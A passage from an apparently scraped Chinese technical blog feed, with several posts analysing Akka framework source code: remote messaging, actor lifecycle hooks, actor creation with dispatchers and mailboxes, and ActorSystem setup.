handleOption: Option[AkkaProtocolHandle], writing: Boolean): ActorRef = &#123; require(transportMapping contains localAddress, &quot;Transport mapping is not defined for the address&quot;) // refuseUid is ignored for read-only endpoints since the UID of the remote system is already known and has passed // quarantine checks val refuseUid = endpoints.refuseUid(remoteAddress) if (writing) context.watch(context.actorOf( RARP(extendedSystem).configureDispatcher(ReliableDeliverySupervisor.props( handleOption, localAddress, remoteAddress, refuseUid, transport, endpointSettings, AkkaPduProtobufCodec, receiveBuffers)).withDeploy(Deploy.local), &quot;reliableEndpointWriter-&quot; + AddressUrlEncoder(remoteAddress) + &quot;-&quot; + endpointId.next())) else context.watch(context.actorOf( RARP(extendedSystem).configureDispatcher(EndpointWriter.props( handleOption, localAddress, remoteAddress, refuseUid, transport, endpointSettings, AkkaPduProtobufCodec, receiveBuffers, reliableDeliverySupervisor = None)).withDeploy(Deploy.local), &quot;endpointWriter-&quot; + AddressUrlEncoder(remoteAddress) + &quot;-&quot; + endpointId.next())) &#125; createEndpoint最终创建了ReliableDeliverySupervisor这个Actor，也就是说RemoteActorRef最终又把消息发送给了ReliableDeliverySupervisor，ReliableDeliverySupervisor收到消息去调用handleSend方法。 12345678910private def handleSend(send: Send): Unit = if (send.message.isInstanceOf[SystemMessage]) &#123; val sequencedSend = send.copy(seqOpt = Some(nextSeq())) tryBuffer(sequencedSend) // If we have not confirmed the remote UID we cannot transfer the system message at this point just buffer it. // GotUid will kick resendAll() causing the messages to be properly written. // Flow control by not sending more when we already have many outstanding. if (uidConfirmed &amp;&amp; resendBuffer.nonAcked.size &lt;= settings.SysResendLimit) writer ! sequencedSend &#125; else writer ! send 除去特殊情况，用户发的普通消息又发送给了writer，艾玛我去，真是绕啊。writer是什么呢？ 3.2 createWriter1var writer: ActorRef = createWriter() 1234567891011private def createWriter(): ActorRef = &#123; context.watch(context.actorOf(RARP(context.system).configureDispatcher(EndpointWriter.props( handleOrActive = currentHandle, localAddress = localAddress, remoteAddress = remoteAddress, refuseUid, transport = transport, settings = settings, AkkaPduProtobufCodec, receiveBuffers = receiveBuffers, reliableDeliverySupervisor = Some(self))).withDeploy(Deploy.local), &quot;endpointWriter&quot;)) 很显然这又是一个Actor！！！哎，继续查找EndpointWriter这个Actor喽 12 def receive = if (handle.isEmpty) initializing else writing 123456789101112131415val writing: Receive = &#123; case s: Send ⇒ if (!writeSend(s)) &#123; enqueueInBuffer(s) scheduleBackoffTimer() context.become(buffering) &#125; // We are in Writing state, so buffer is empty, safe to stop here case FlushAndStop ⇒ flushAndStop() case AckIdleCheckTimer if ackDeadline.isOverdue() ⇒ trySendPureAck() &#125; 这个Actor会先判断是否已经初始化，这里就假设初始化吧，初始化之后就会进入writing这个偏函数，对send类型的消息，又调用了writeSend函数。这个函数简单来看，就是调用codec对消息进行序列化，然后创建了一个pdu，最终把pdu通过handle的write发送出去。handle又是什么呢？ 3.3 AkkaProtocolHandle1var handle: Option[AkkaProtocolHandle] = handleOrActive 12345678910111213141516private[remote] class AkkaProtocolHandle( _localAddress: Address, _remoteAddress: Address, val readHandlerPromise: Promise[HandleEventListener], _wrappedHandle: AssociationHandle, val handshakeInfo: HandshakeInfo, private val stateActor: ActorRef, private val codec: AkkaPduCodec) extends AbstractTransportAdapterHandle(_localAddress, _remoteAddress, _wrappedHandle, AkkaScheme) &#123; override def write(payload: ByteString): Boolean = wrappedHandle.write(codec.constructPayload(payload)) override def disassociate(): Unit = disassociate(Unknown) def disassociate(info: DisassociateInfo): Unit = stateActor ! DisassociateUnderlying(info)&#125; handle最终是一个AkkaProtocolHandle，这个对象我们不再具体分析，我们可以认为这是一个本地与远程地址链接的通道，通过这个通道就可以与远程actor发送消息了。 4.总结 分析到这个地方，actorSelection与远程通信的过程大概就梳理清楚了。为了方便理解，作者特意辛苦的画了一个流程图，以供参考。细心的读者一定会问，那我的消息通过handle发送出去了，对方怎么接收呢？接收之后怎么发送到指定actor的邮箱呢？这一点我们后面再分析。 actorSelection分析清楚了，剩下的就是通过ActorRef发送消息了。那么如何得到远程Actor的ActorRef呢？当然是“问”它了啊，怎么“问”呢？发消息啊。发什么消息呢？ 1234567/** * A message all Actors will understand, that when processed will reply with * [[akka.actor.ActorIdentity]] containing the `ActorRef`. The `messageId` * is returned in the `ActorIdentity` message as `correlationId`. */@SerialVersionUID(1L)final case class Identify(messageId: Any) extends AutoReceivedMessage with NotInfluenceReceiveTimeout 官网对Identify的注释非常清楚，这个消息继承了AutoReceivedMessage，所有的Actor都理解该消息，且受到该消息后会返回akka.actor.ActorIdentity消息，里面包含当前Actor的ActorRef。那么所有的Actor为啥都理解该消息呢？ 123456789101112131415161718192021222324252627282930313233//Memory consistency is handled by the Mailbox (reading mailbox status then processing messages, then writing mailbox status final def invoke(messageHandle: Envelope): Unit = &#123; val influenceReceiveTimeout = !messageHandle.message.isInstanceOf[NotInfluenceReceiveTimeout] try &#123; currentMessage = messageHandle if (influenceReceiveTimeout) cancelReceiveTimeout() messageHandle.message match &#123; case msg: AutoReceivedMessage ⇒ autoReceiveMessage(messageHandle) case msg ⇒ receiveMessage(msg) &#125; currentMessage = null // reset current message after successful invocation &#125; catch handleNonFatalOrInterruptedException &#123; e ⇒ handleInvokeFailure(Nil, e) &#125; finally &#123; if (influenceReceiveTimeout) checkReceiveTimeout // Reschedule receive timeout &#125; &#125; def autoReceiveMessage(msg: Envelope): Unit = &#123; if (system.settings.DebugAutoReceive) publish(Debug(self.path.toString, clazz(actor), &quot;received AutoReceiveMessage &quot; + msg)) msg.message match &#123; case t: Terminated ⇒ receivedTerminated(t) case AddressTerminated(address) ⇒ addressTerminated(address) case Kill ⇒ throw ActorKilledException(&quot;Kill&quot;) case PoisonPill ⇒ self.stop() case sel: ActorSelectionMessage ⇒ receiveSelection(sel) case Identify(messageId) ⇒ sender() ! ActorIdentity(messageId, Some(self)) &#125; &#125; 如果读者看过我之前分析的文章对上面的代码一定还有印象，它是ActorCell里面处理消息的两个函数，invoke会先判断消息类型是不是AutoReceivedMessage，如果是就自己处理了，不会去调用开发者自定义的receive函数。而Identify属于AutoReceivedMessage，收到后给sender发送了ActorIdentity消息，该消息的第二个参数是当前Actor的ActorFef变量。这样本地的actor收到远程actor返回的ActorIdentity，就可以通过对方的ActorRef给它发送消息了。当然本地actor收到的ActorIdentity消息中，第二个参数应该是一个RemoteActorRef类型。如何通过RemoteActorRef发送消息，上文已经分析清楚了，其实actorSelection最终也是通过远程actor的ActorPath创建了对应的RemoteActorRef，来发送消息的。至此给远程actor发消息的两种方法就讲解完毕了。其实还有第三种方式，就是在本地创建一个远程Actor，当然了最终还是需要通过RemoteActorRef发消息的，这个具体就不再详细介绍了。 5.参考https://www.cnblogs.com/gabry/p/9377182.html","categories":[{"name":"network","slug":"network","permalink":"https://wuhaocn.github.io/categories/network/"}],"tags":[{"name":"akka","slug":"akka","permalink":"https://wuhaocn.github.io/tags/akka/"}]},{"title":"Akka-Actor-生命周期","slug":"network/akka/Akka-Actor-生命周期","date":"2021-12-03T07:47:57.749Z","updated":"2021-12-03T09:07:15.157Z","comments":true,"path":"2021/12/03/network/akka/Akka-Actor-生命周期/","link":"","permalink":"https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Actor-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/","excerpt":"","text":"1.概述我们首先来看一下官方给出的Actor的声明周期的图: 在上图中，Actor系统中的路径代表一个地方，其可能会被活着的Actor占据。最初路径都是空的。 创建 在调用actorOf()时，将会为指定的路径分配根据传入Props创建的一个Actor引用。该Actor引用是由路径和一个Uid标识的。 重启 重启时只会替换有Props定义的Actor示例，但不会替换引用，因此Uid保持不变。 停止 当Actor停止时，其引用的生命周期结束。在这一时间点上相关的生命周期事件被调用，监视该Actor的Actor都会获得终止通知。当引用停止后，路径可以重复使用，通过actorOf()创建一个Actor。在这种情况下，除了UID不同外，新引用与老引用是相同的。ActorRef始终表示引用（路径和UID）而不只是一个给定的路径。因此如果Actor停止，并且创建一个新的具有相同名称的Actor，则指向老化身的ActorRef将不会指向新的化身。 选择 相对地，ActorSelection指向路径（或多个路径，如果使用了通配符），且完全不关注有没有引用占据它。因此ActorSelection 不能被监视。获取某路径下的当前化身ActorRef是可能的，只要向该ActorSelection发送Identify，如果收到ActorIdentity回应，则正确的引用就包含其中。也可以使用ActorSelection的resolveOne方法，它会返回一个包含匹配ActorRef的Future。 状态切换 从上图我们可以发现Actor的生命周期主要包含三个状态：开始、终止和重启。下面分别就 这三个状态进行说明。 2.开始 其实Actor的生命周期是使用Hooks体现和控制的，我们可以重新相关的hooks，从而实现对Actor生命周期各环节的细粒度控制。而当Akka通过Props构建一个Actor后，这个Actor可以立即开始处理消息，进入开始（started）状态。Akka提供了针对开始状态的事件接口（event hooks）preStart方法，因此，我们可以重写该方法进行一些操作，例如： 1234override def preStart=&#123; log.info (&quot;Starting storage actor...&quot;) initDB &#125; 3.终止一个Actor可能因为完成运算、发生异常又或者人为通过发送Kill，PoisonPill强行终止等而进入停止（stopping）状态。而这个终止过程分为两步： 第一步：Actor将挂起对邮箱的处理，并向所有子Actor发送终止命令，然后处理来自子Actor的终止消息直到所有的子Actor都完成终止。 第二步：终止自己，调用postStop方法，清空邮箱，向DeathWatch发布Terminated，通知其监管者。 整个人过程保证Actor系统中的子树以一种有序的方式终止，将终止命令传播到叶子结点并收集它们回送的确认消息给被终止的监管者。如果其中某个Actor没有响应（即由于处理消息用了太长时间以至于没有收到终止命令），整个过程将会被阻塞。因此，我们可以再最后调用postStop方法，来进行一些资源清理等工作，例如： 1override def postStop=&#123; log.info (&quot;Stopping storage actor...&quot;) db.release &#125; 4.重启 重启是Actor生命周期里一个最重要的环节。在一个Actor的生命周期里可能因为多种原因发生重启（Restart）。造成一个Actor需要重启的原因可能有下面几个： （1）在处理某特定消息时造成了系统性的异常，必须通过重启来清理系统错误 （2）内部状态毁坏，必须通过重启来重新构建状态 （3）在处理消息时无法使用到一些依赖资源，需要重启来重新配置资源 其实，Actor的重启过程也是一个递归的过程，由于其比较复杂，先上个图：在默认情况下 ，重启过程主要分为以下几步：（1）该Actor将被挂起（2）调用旧实例的 supervisionStrategy.handleSupervisorFailing 方法 (缺省实现为挂起所有的子Actor)（3）调用preRestart方法，preRestart方法将所有的children Stop掉了！（Stop动作，大家注意！），并调用postStop回收资源（4）调用旧实例的 supervisionStrategy.handleSupervisorRestarted 方法 (缺省实现为向所有剩下的子Actor发送重启请求)（5）等待所有子Actor终止直到 preRestart 最终结束（6）再次调用之前提供的actor工厂创建新的actor实例（7）对新实例调用 postRestart（默认postRestart是调用preStart方法）（8）恢复运行新的actor​ 参考https://www.cnblogs.com/junjiang3/p/9747594.html","categories":[{"name":"network","slug":"network","permalink":"https://wuhaocn.github.io/categories/network/"}],"tags":[{"name":"akka","slug":"akka","permalink":"https://wuhaocn.github.io/tags/akka/"}]},{"title":"Akka-Actor-Actor创建","slug":"network/akka/Akka-Actor-Actor创建","date":"2021-12-03T06:15:17.557Z","updated":"2021-12-03T09:07:15.123Z","comments":true,"path":"2021/12/03/network/akka/Akka-Actor-Actor创建/","link":"","permalink":"https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Actor-Actor%E5%88%9B%E5%BB%BA/","excerpt":"","text":"1.Actor创建1.1 创建过程 上篇我们介绍了ActorSystem的创建过程，下面我们就研究一下actor的创建过程。 12ActorSystem actorSystem = ActorSystem.create(serverName, config, ClassUtils.getClassLoader());actorSystem.actorOf(props.withDeploy(new Deploy(new RemoteScope(address))), &quot;avatar&quot;); 普通情况下，我们一般使用ActorSystem的actorOf来创建actor，当然通过上一篇博客的介绍，我们已经知道actorOf是继承自ActorRefFactory的函数。 1234def actorOf(props: Props, name: String): ActorRef = if (guardianProps.isEmpty) guardian.underlying.attachChild(props, name, systemService = false) else throw new UnsupportedOperationException( s&quot;cannot create top-level actor [$name] from the outside on ActorSystem with custom user guardian&quot;) 也比较简单，就是判断一下guardianProps是不是为空，为空则调用guardian.underlying.attachChild方法创建一个ActorRef。**new ActorSystemImpl(name, appConfig, cl, defaultEC, None, setup).start()** 这段代码显示在创建ActorSystemImpl时，guardianProps一定为空，具体guardianProps的作用我们暂时先忽略。 12345def guardian: LocalActorRef = provider.guardian/** * Reference to the supervisor used for all top-level user actors. */def guardian: LocalActorRef 通过定位guardian我们发现这是一个LocalActorRef，而且通过官方源码的说明可以看出，这是一个root监督者，用来监督所有用户创建的actor。Akka的actor是按照树状结构创建，都是有一定层级的，actor的路径一般都是/user/actorParent1/actorChild1，其中guardian是user的位置。 12345678910111213/** * Local (serializable) ActorRef that is used when referencing the Actor on its &quot;home&quot; node. * * INTERNAL API */private[akka] class LocalActorRef private[akka] ( _system: ActorSystemImpl, _props: Props, _dispatcher: MessageDispatcher, _mailboxType: MailboxType, _supervisor: InternalActorRef, override val path: ActorPath) extends ActorRefWithCell with LocalRef 上面是LocalActorRef的定义。上一篇博客我们也介绍了provider的创建过程，它默认是一个LocalActorRefProvider，那就可以找到guardian具体创建的过程了。 123456789override lazy val guardian: LocalActorRef = &#123; val cell = rootGuardian.underlying cell.reserveChild(&quot;user&quot;) val ref = new LocalActorRef(system, system.guardianProps.getOrElse(Props(classOf[LocalActorRefProvider.Guardian], guardianStrategy)), defaultDispatcher, defaultMailbox, rootGuardian, rootPath / &quot;user&quot;) cell.initChild(ref) ref.start() ref &#125; 1.2 构成分析上面的代码我们看到，LocalActorRef创建时传入了几个非常重要的参数：defaultDispatcher、defaultMailbox、rootGuardian和rootPath / “user”。之所以重要，是因为通过它们我们可以再深入actor的创建过程。Dispatcher和mailbox都是actor运行非常重要的概念，其中mailbox负责存储actor收到的消息，dispatcher负责从mailbox取消息，分配线程给actor执行具体的业务逻辑。我们逐一进行简要分析。 1234/** * The one and only default dispatcher. */ def defaultGlobalDispatcher: MessageDispatcher = lookup(DefaultDispatcherId) 12345/** * The id of the default dispatcher, also the full key of the * configuration of the default dispatcher. */ final val DefaultDispatcherId = &quot;akka.actor.default-dispatcher&quot; 通过追踪defaultDispatcher的创建，我们最终定位到了上面这段代码，很明显是根据默认配置创建了akka.actor.default-dispatcher对应的MessageDispatcher实例。那么akka.actor.default-dispatcher究竟是什么呢？这个得从reference.conf里面看一下。 123456789101112131415161718192021222324252627282930default-dispatcher &#123; # Must be one of the following # Dispatcher, PinnedDispatcher, or a FQCN to a class inheriting # MessageDispatcherConfigurator with a public constructor with # both com.typesafe.config.Config parameter and # akka.dispatch.DispatcherPrerequisites parameters. # PinnedDispatcher must be used together with executor=thread-pool-executor. type = &quot;Dispatcher&quot; # Which kind of ExecutorService to use for this dispatcher # Valid options: # - &quot;default-executor&quot; requires a &quot;default-executor&quot; section # - &quot;fork-join-executor&quot; requires a &quot;fork-join-executor&quot; section # - &quot;thread-pool-executor&quot; requires a &quot;thread-pool-executor&quot; section # - &quot;affinity-pool-executor&quot; requires an &quot;affinity-pool-executor&quot; section # - A FQCN of a class extending ExecutorServiceConfigurator executor = &quot;default-executor&quot; # This will be used if you have set &quot;executor = &quot;default-executor&quot;&quot;. # If an ActorSystem is created with a given ExecutionContext, this # ExecutionContext will be used as the default executor for all # dispatchers in the ActorSystem configured with # executor = &quot;default-executor&quot;. Note that &quot;default-executor&quot; # is the default value for executor, and therefore used if not # specified otherwise. If no ExecutionContext is given, # the executor configured in &quot;fallback&quot; will be used. default-executor &#123; fallback = &quot;fork-join-executor&quot; &#125; &#125; 很明显这是一个fork-join-executor，那么fork-join-executor具体是如何完成实例的创建呢？从lookup这段代码来看，是通过MessageDispatcherConfigurator来构造的，根据类名来猜，它应该是读取配置，然后创建MessageDispatcher类的实例的。那么MessageDispatcherConfigurator具体是什么呢？ 1234567891011121314151617181920212223242526272829303132333435abstract class MessageDispatcherConfigurator(_config: Config, val prerequisites: DispatcherPrerequisites) &#123; val config: Config = new CachingConfig(_config) /** * Returns an instance of MessageDispatcher given the configuration. * Depending on the needs the implementation may return a new instance for * each invocation or return the same instance every time. */ def dispatcher(): MessageDispatcher def configureExecutor(): ExecutorServiceConfigurator = &#123; def configurator(executor: String): ExecutorServiceConfigurator = executor match &#123; case null | &quot;&quot; | &quot;fork-join-executor&quot; ⇒ new ForkJoinExecutorConfigurator(config.getConfig(&quot;fork-join-executor&quot;), prerequisites) case &quot;thread-pool-executor&quot; ⇒ new ThreadPoolExecutorConfigurator(config.getConfig(&quot;thread-pool-executor&quot;), prerequisites) case &quot;affinity-pool-executor&quot; ⇒ new AffinityPoolConfigurator(config.getConfig(&quot;affinity-pool-executor&quot;), prerequisites) case fqcn ⇒ val args = List( classOf[Config] → config, classOf[DispatcherPrerequisites] → prerequisites) prerequisites.dynamicAccess.createInstanceFor[ExecutorServiceConfigurator](fqcn, args).recover(&#123; case exception ⇒ throw new IllegalArgumentException( (&quot;&quot;&quot;Cannot instantiate ExecutorServiceConfigurator (&quot;executor = [%s]&quot;), defined in [%s], make sure it has an accessible constructor with a [%s,%s] signature&quot;&quot;&quot;) .format(fqcn, config.getString(&quot;id&quot;), classOf[Config], classOf[DispatcherPrerequisites]), exception) &#125;).get &#125; config.getString(&quot;executor&quot;) match &#123; case &quot;default-executor&quot; ⇒ new DefaultExecutorServiceConfigurator(config.getConfig(&quot;default-executor&quot;), prerequisites, configurator(config.getString(&quot;default-executor.fallback&quot;))) case other ⇒ configurator(other) &#125; &#125;&#125; MessageDispatcherConfigurator代码不是太长，简单浏览一下代码就会发现，fork-join-executor对应了ForkJoinExecutorConfigurator。这个类是一个抽象类，里面有一个dispatcher函数返回MessageDispatcher，那么究竟是哪个子类实现了这个方法呢？我们再来看一下lookupConfigurator的具体代码，就会发现其中有一段configuratorFrom(config(id))代码非常可疑，它创建了MessageDispatcherConfigurator类的一个实例。 123456789101112131415161718private def lookupConfigurator(id: String): MessageDispatcherConfigurator = &#123; dispatcherConfigurators.get(id) match &#123; case null ⇒ // It doesn&#x27;t matter if we create a dispatcher configurator that isn&#x27;t used due to concurrent lookup. // That shouldn&#x27;t happen often and in case it does the actual ExecutorService isn&#x27;t // created until used, i.e. cheap. val newConfigurator = if (cachingConfig.hasPath(id)) configuratorFrom(config(id)) else throw new ConfigurationException(s&quot;Dispatcher [$id] not configured&quot;) dispatcherConfigurators.putIfAbsent(id, newConfigurator) match &#123; case null ⇒ newConfigurator case existing ⇒ existing &#125; case existing ⇒ existing &#125;&#125; 1234567891011121314151617181920212223private def configuratorFrom(cfg: Config): MessageDispatcherConfigurator = &#123; if (!cfg.hasPath(&quot;id&quot;)) throw new ConfigurationException(&quot;Missing dispatcher &#x27;id&#x27; property in config: &quot; + cfg.root.render) cfg.getString(&quot;type&quot;) match &#123; case &quot;Dispatcher&quot; ⇒ new DispatcherConfigurator(cfg, prerequisites) case &quot;BalancingDispatcher&quot; ⇒ // FIXME remove this case in 2.4 throw new IllegalArgumentException(&quot;BalancingDispatcher is deprecated, use a BalancingPool instead. &quot; + &quot;During a migration period you can still use BalancingDispatcher by specifying the full class name: &quot; + classOf[BalancingDispatcherConfigurator].getName) case &quot;PinnedDispatcher&quot; ⇒ new PinnedDispatcherConfigurator(cfg, prerequisites) case fqn ⇒ val args = List(classOf[Config] → cfg, classOf[DispatcherPrerequisites] → prerequisites) prerequisites.dynamicAccess.createInstanceFor[MessageDispatcherConfigurator](fqn, args).recover(&#123; case exception ⇒ throw new ConfigurationException( (&quot;Cannot instantiate MessageDispatcherConfigurator type [%s], defined in [%s], &quot; + &quot;make sure it has constructor with [com.typesafe.config.Config] and &quot; + &quot;[akka.dispatch.DispatcherPrerequisites] parameters&quot;) .format(fqn, cfg.getString(&quot;id&quot;)), exception) &#125;).get &#125;&#125; 而进入到configuratorFrom函数就会发现，它根据配置的type字段分别创建不同的MessageDispatcherConfigurator，而前面的配置文件中type是Dispatcher。那就对应了DispatcherConfigurator，这又是一个什么类呢？它是一个MessageDispatcherConfigurator子类，并且实现了dispatcher函数。这个函数创建了最终的MessageDispatcher。这个类又调用了configureExecutor()方法传入了一个ExecutorServiceConfigurator实例，根据前面的代码我们知道这就是ForkJoinExecutorConfigurator。 123456789101112131415161718192021/** * Configurator for creating [[akka.dispatch.Dispatcher]]. * Returns the same dispatcher instance for each invocation * of the `dispatcher()` method. */class DispatcherConfigurator(config: Config, prerequisites: DispatcherPrerequisites) extends MessageDispatcherConfigurator(config, prerequisites) &#123; private val instance = new Dispatcher( this, config.getString(&quot;id&quot;), config.getInt(&quot;throughput&quot;), config.getNanosDuration(&quot;throughput-deadline-time&quot;), configureExecutor(), config.getMillisDuration(&quot;shutdown-timeout&quot;)) /** * Returns the same dispatcher instance for each invocation */ override def dispatcher(): MessageDispatcher = instance&#125; 自此一个MessageDispatcher创建完成。这创建过程真是曲折蜿蜒啊，哈哈哈。不过有些是为了抽象、封装，有些是为了可配置，稍微复杂了点。下面就分析defaultMailbox如何创建的。 1private lazy val defaultMailbox = system.mailboxes.lookup(Mailboxes.DefaultMailboxId) 跟dispatcher有点类似，也是同样的lookup创建的，当然这也是为了可配置（DefaultMailboxId = &quot;akka.actor.default-mailbox&quot;）。跟踪lookup来到以下代码。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647private def lookupConfigurator(id: String): MailboxType = &#123; mailboxTypeConfigurators.get(id) match &#123; case null ⇒ // It doesn&#x27;t matter if we create a mailbox type configurator that isn&#x27;t used due to concurrent lookup. val newConfigurator = id match &#123; // TODO RK remove these two for Akka 2.3 case &quot;unbounded&quot; ⇒ UnboundedMailbox() case &quot;bounded&quot; ⇒ new BoundedMailbox(settings, config(id)) case _ ⇒ if (!settings.config.hasPath(id)) throw new ConfigurationException(s&quot;Mailbox Type [$&#123;id&#125;] not configured&quot;) val conf = config(id) val mailboxType = conf.getString(&quot;mailbox-type&quot;) match &#123; case &quot;&quot; ⇒ throw new ConfigurationException(s&quot;The setting mailbox-type, defined in [$id] is empty&quot;) case fqcn ⇒ val args = List(classOf[ActorSystem.Settings] → settings, classOf[Config] → conf) dynamicAccess.createInstanceFor[MailboxType](fqcn, args).recover(&#123; case exception ⇒ throw new IllegalArgumentException( s&quot;Cannot instantiate MailboxType [$fqcn], defined in [$id], make sure it has a public&quot; + &quot; constructor with [akka.actor.ActorSystem.Settings, com.typesafe.config.Config] parameters&quot;, exception) &#125;).get &#125; if (!mailboxNonZeroPushTimeoutWarningIssued) &#123; mailboxType match &#123; case m: ProducesPushTimeoutSemanticsMailbox if m.pushTimeOut.toNanos &gt; 0L ⇒ warn(s&quot;Configured potentially-blocking mailbox [$id] configured with non-zero pushTimeOut ($&#123;m.pushTimeOut&#125;), &quot; + s&quot;which can lead to blocking behavior when sending messages to this mailbox. &quot; + s&quot;Avoid this by setting `$id.mailbox-push-timeout-time` to `0`.&quot;) mailboxNonZeroPushTimeoutWarningIssued = true case _ ⇒ // good; nothing to see here, move along, sir. &#125; &#125; mailboxType &#125; mailboxTypeConfigurators.putIfAbsent(id, newConfigurator) match &#123; case null ⇒ newConfigurator case existing ⇒ existing &#125; case existing ⇒ existing &#125; &#125; 跟dispatcher创建有点类似，就是先查找有没有，没有就创建一个，只不过不同的是，这段代码只是创建了MailboxType，而没有直接创建真正的消息队列，不过后面再具体分析。那akka.actor.default-mailbox究竟是什么呢？同样需要翻reference.conf配置 123456789101112131415161718192021222324default-mailbox &#123; # FQCN of the MailboxType. The Class of the FQCN must have a public # constructor with # (akka.actor.ActorSystem.Settings, com.typesafe.config.Config) parameters. mailbox-type = &quot;akka.dispatch.UnboundedMailbox&quot; # If the mailbox is bounded then it uses this setting to determine its # capacity. The provided value must be positive. # NOTICE: # Up to version 2.1 the mailbox type was determined based on this setting; # this is no longer the case, the type must explicitly be a bounded mailbox. mailbox-capacity = 1000 # If the mailbox is bounded then this is the timeout for enqueueing # in case the mailbox is full. Negative values signify infinite # timeout, which should be avoided as it bears the risk of dead-lock. mailbox-push-timeout-time = 10s # For Actor with Stash: The default capacity of the stash. # If negative (or zero) then an unbounded stash is used (default) # If positive then a bounded stash is used and the capacity is set using # the property stash-capacity = -1&#125; 在lookupConfigurator函数中有一段很重要的代码：dynamicAccess.createInstanceFor[MailboxType](fqcn, args)。它同样调用了dynamicAccess创建了一个MailboxType的实例，实例的类型就是mailbox-type的值。那么akka.dispatch.UnboundedMailbox究竟又是怎么样的呢？ 1234567891011121314151617181920212223242526272829/** * MailboxType is a factory to create MessageQueues for an optionally * provided ActorContext. * * &lt;b&gt;Possibly Important Notice&lt;/b&gt; * * When implementing a custom mailbox type, be aware that there is special * semantics attached to `system.actorOf()` in that sending to the returned * ActorRef may—for a short period of time—enqueue the messages first in a * dummy queue. Top-level actors are created in two steps, and only after the * guardian actor has performed that second step will all previously sent * messages be transferred from the dummy queue into the real mailbox. */trait MailboxType &#123; def create(owner: Option[ActorRef], system: Option[ActorSystem]): MessageQueue&#125; trait ProducesMessageQueue[T &lt;: MessageQueue] /** * UnboundedMailbox is the default unbounded MailboxType used by Akka Actors. */final case class UnboundedMailbox() extends MailboxType with ProducesMessageQueue[UnboundedMailbox.MessageQueue] &#123; def this(settings: ActorSystem.Settings, config: Config) = this() final override def create(owner: Option[ActorRef], system: Option[ActorSystem]): MessageQueue = new UnboundedMailbox.MessageQueue&#125; 源码中对MailboxType的描述也非常清楚。这是一个工厂类，是用来创建MessageQueues的，只不过这个名字非常奇怪，为啥不叫MailboxFactory呢，或者MessageQueueFactory？鬼知道啊。 MailboxType的创建过程也比较清楚了，具体UnboundedMailbox.MessageQueue的类是怎么样的，继承结构又是怎么样的，我们就不再继续深入分析了。 下面我们来看guardian调用的第一个方法underlying，这个词的意思是表面下的，下层的，它是一个ActorCell类型。看看它继承的类，貌似还挺复杂的。 最终调用了ActorCell的attachChild方法，而这个方法调用了makeChild，最重要的代码如下面红色框表示，调用了ActorCell.provider的actorOf，通过initChild加入了当前的children，调用actor的start方法，actor创建结束。children具体的数据结构我们暂时也不再深入研究。​ 不过，通过ActorCell的构造函数以及继承关系我们知道上面代码中的provider就是ActorSystemImpl中的provider，也就是默认的LocalActorRefProvider，那我们还得回溯代码去看具体的actorOf函数。 由于代码很长，可以将无关的代码折叠起来。如上图，会先判断当前有没有router，很显然没有；又用deployer中的配置，判断有没有对当前的dispatcher和mailboxType进行覆盖，很显然也没有，一切保持原样。最后一个if语句，如果async为true则创建RepointableActorRef，根据上面的代码分析，async是true。RepointableActorRef创建完成之后，调用了initialize完成初始化。 123456789101112131415161718192021222324252627/** * Initialize: make a dummy cell which holds just a mailbox, then tell our * supervisor that we exist so that he can create the real Cell in * handleSupervise(). * * Call twice on your own peril! * * This is protected so that others can have different initialization. */def initialize(async: Boolean): this.type = underlying match &#123; case null ⇒ swapCell(new UnstartedCell(system, this, props, supervisor)) swapLookup(underlying) supervisor.sendSystemMessage(Supervise(this, async)) if (!async) point(false) this case other ⇒ throw new IllegalStateException(&quot;initialize called more than once!&quot;) &#125; /** * This method is supposed to be called by the supervisor in handleSupervise() * to replace the UnstartedCell with the real one. It assumes no concurrent * modification of the `underlying` field, though it is safe to send messages * at any time. */def point(catchFailures: Boolean): this.type 在initialize中，给supervisor给监督者发发送了一个Supervise消息，以便监督自己；然后调用了point，具体含义可参考官方源码的注释。其实RepointableActorRef还是比较麻烦的，读者有兴趣可以自己研究，不过我个人感觉它应该主要是为了防止在actor重新创建或新建的过程中消息不会丢失设计的。具体我也没有太明白，后面再深入研究了。到这里system.actorOf基本就算执行结束，它返回了一个InternalActorRef，这是ActorRef的一个子类。这样，后续的代码就可以使用 ！ 或tell给actor发送消息了。不过我们虽然大致研究了actor的创建过程，但并没有进入深入的研究，比如，我们自身的actor的实现类是在什么时候初始化的并不知道。当然这并不妨碍我们继续研究akka的源码。​ 2.参考https://www.cnblogs.com/gabry/p/9339785.html","categories":[{"name":"network","slug":"network","permalink":"https://wuhaocn.github.io/categories/network/"}],"tags":[{"name":"akka","slug":"akka","permalink":"https://wuhaocn.github.io/tags/akka/"}]},{"title":"Akka-Actor-ActorSystem","slug":"network/akka/Akka-Actor-ActorSystem","date":"2021-12-03T06:15:06.161Z","updated":"2021-12-03T09:07:15.172Z","comments":true,"path":"2021/12/03/network/akka/Akka-Actor-ActorSystem/","link":"","permalink":"https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Actor-ActorSystem/","excerpt":"","text":"1.ActorSystem-创建使用Akka首先要创建的一个对象就是ActorSystem，那么我们就先分析这个类及其相关的技术细节。 1234567891011String clusterName = &quot;test&quot;;Config config = ConfigFactory.defaultReference();config = ConfigFactory.parseMap(new HashMap&lt;String, Object&gt;() &#123;&#123; put(&quot;akka.actor.provider&quot;, &quot;akka.remote.RemoteActorRefProvider&quot;); put(&quot;akka.remote.netty.tcp.hostname&quot;, ip); put(&quot;akka.remote.netty.tcp.port&quot;, port); put(&quot;akka.remote.netty.tcp.maximum-frame-size&quot;, 100 * 1024 * 1024); final String serializer = &quot;protostuff&quot;; put(&quot;akka.actor.serializers.&quot; + serializer, ProtoStuffer.class.getName());&#125;&#125;).withFallback(config);ActorSystem actorSystem = ActorSystem.create(clusterName, config, ClassUtils.getClassLoader()); 第一步就是创建ActorSystem,以Java调用为例需要如下配置： 指定系统集群名称：此处为actor路径的一部分 指定akka配置：配置服务地址及端口以及序列化方式等 指定类加载器 配置好上述配置后调用 ActorSystem.create创建对象。 1.1. 构建方式ActorSystem创建主要包含集群名称，配置，类加载器，扩展上下文等。 1.2. 抽象定义 我们来看ActorSystem类，这是一个抽象类，它继承了ActorRefFactory特质，下面是源码中对该特质的描述。很明显，这个特质是用来创建Actor实例的。我们常用的actorFor和actorSelection是该特质提供的比较重要的方法，当然还有与创建actor有关的其他函数和字段。ActorSystem是一个抽象类，除了继承ActorRefFactory特质的函数和字段之外，定义了一些其他字段和方法，但也都没有具体的实现。 